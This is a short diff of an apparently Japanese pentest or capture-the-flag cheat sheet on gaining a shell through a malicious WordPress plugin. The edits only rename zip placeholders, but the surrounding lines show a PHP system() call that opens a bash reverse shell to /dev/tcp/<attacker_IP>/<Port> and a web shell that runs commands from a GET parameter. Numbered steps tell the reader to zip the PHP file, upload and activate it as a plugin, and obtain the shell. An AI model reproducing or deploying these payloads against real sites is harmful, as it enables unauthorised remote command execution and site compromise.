@@ -137,7 +137,7 @@ system("bash -c 'bash -i >&　/dev/tcp/<attacker_IP>/<Port> 0>&1'");
 
 3. zip化する
 ```zsh
-zip <output_name> <file>
+zip <zip_filename> <php_filename>
 ```
 
 4. WordPress管理画面からプラグインをアップロード→Activate Pluginし、リバースシェルを獲得
@@ -157,7 +157,7 @@ echo system($_GET["cmd"]);
 
 2. zip化する
 ```zsh
-
+zip <zip_filename> <php_filename>
 ```
 
 3. WordPress管理画面からプラグインをアップロード→Activate Plugin
